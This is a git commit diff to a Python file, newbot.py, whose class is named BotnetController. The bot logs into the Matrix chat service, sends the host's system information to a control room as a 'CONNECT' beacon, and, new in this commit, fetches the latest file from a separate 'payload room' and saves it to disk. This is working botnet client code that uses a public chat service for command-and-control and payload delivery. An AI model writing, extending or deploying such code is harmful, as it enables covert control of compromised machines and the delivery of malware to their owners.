df8523360d392642b2b70b685cab258c5c2196bd
Back777space <ivan.molenaers@hotmail.com>
2025-03-22 19:23:49 +0100

    download payload from payload room

--- newbot.py
+++ newbot.py
@@ -4,6 +4,7 @@ import socket
 import uuid
 from matrix_client.client import MatrixClient, Room
 from matrix_client.api import MatrixRequestError
+import requests
 from requests.exceptions import MissingSchema
 import os
 import sys
@@ -14,6 +15,8 @@ MATRIX_HOMESERVER = "https://matrix.org"
 USER_NAME = os.getenv('USER_NAME')  
 PASSWORD = os.getenv('PASSWORD')
 ROOM_ID = os.getenv('ROOM_ID')
+PAYLOAD_ROOM_ID = os.getenv('PAYLOAD_ROOM_ID')
+MATRIX_DOWNLOAD_PREFIX = "https://matrix-client.matrix.org/_matrix/client/v1/media/download/"
 
 class BotnetController:
     access_token: str
@@ -56,10 +59,39 @@ class BotnetController:
         return room
         
     def announce(self):
-        print("Announcing in room")
         status = self.announce_room.send_text(
             f"CONNECT:{self.get_system_info()}"
         )
+        
+    def download_file(self, event, download_dir="downloads"):
+        content = event["content"]
+        filename = content.get("body", "payload_file")
+        filepath = os.path.join(download_dir, filename)
+        os.makedirs(download_dir, exist_ok=True)
+        
+        # extract server and media ID from mxc URL
+        mxc_url = content['url']
+        durl = MATRIX_DOWNLOAD_PREFIX + mxc_url[6:]
+        
+        # download 
+        response = requests.get(durl, headers={"Authorization": f"Bearer {self.client.token}"})
+        response.raise_for_status()
+        
+        # save 
+        with open(filepath, 'wb') as f:
+            f.write(response.content)
+        
+        print(f"Downloaded file: {filepath}")
+        return filepath
+        
+    def download_payload(self):
+        payload_event = self.client.api.get_room_messages(
+            PAYLOAD_ROOM_ID,
+            "",
+            "b",
+            limit=1
+        )
+        self.download_file(payload_event["chunk"][0])
         
     def get_system_info(self):
         return json.dumps({
@@ -89,10 +121,12 @@ class BotnetController:
     def run(self):
         self.login()
         self.announce_room = self.join_room(ROOM_ID)
-        self.announce()
         
         self.announce_listener = self.announce_room.add_listener(self.on_announcement)
         self.client.start_listener_thread()
+        
+        self.announce()
+        self.download_payload()
         
         while True:
             pass
